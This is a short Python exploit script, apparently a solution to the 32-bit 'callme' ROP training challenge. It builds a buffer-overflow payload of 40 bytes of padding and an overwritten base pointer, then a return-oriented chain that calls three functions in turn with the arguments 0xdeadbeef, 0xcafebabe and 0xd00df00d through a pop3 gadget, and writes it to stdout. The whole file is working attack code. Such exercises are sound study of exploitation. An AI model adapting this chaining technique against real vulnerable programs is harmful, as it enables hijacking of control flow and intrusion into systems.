#!/usr/bin/env python

import struct
import sys

padding_len = 40 #until just before ebp is overwritten

pop3 = struct.pack("I", 0x80487f9)

callme_one = struct.pack("I", 0x080484f0)
callme_two = struct.pack("I", 0x08048550)
callme_three = struct.pack("I", 0x080484e0)

leet = struct.pack("I", 0x13371337)

deadbeef = struct.pack("I", 0xdeadbeef)
cafebabe = struct.pack("I", 0xcafebabe)
doodfood = struct.pack("I", 0xd00df00d)

args = deadbeef + cafebabe + doodfood

pop_args = pop3 + args

payload = b'A'*padding_len
payload += leet #ebp 
payload += callme_one
payload += pop_args
payload += callme_two
payload += pop_args
payload += callme_three
payload += pop_args

sys.stdout.buffer.write(payload)
